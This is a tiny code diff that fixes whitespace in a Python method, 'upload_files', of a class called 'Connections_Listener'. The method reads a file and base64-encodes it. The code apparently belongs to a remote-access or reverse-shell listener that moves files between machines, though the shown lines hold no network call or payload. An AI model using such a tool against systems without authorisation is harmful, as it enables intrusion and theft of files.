@@ -47,7 +47,7 @@ class Connections_Listener:
             return f"[+] \"{path}\" file download successful"
 
     @staticmethod
-    def upload_files( path):
+    def upload_files(path):
         with open(path, 'rb') as f:
             return base64.b64encode(f.read())
 
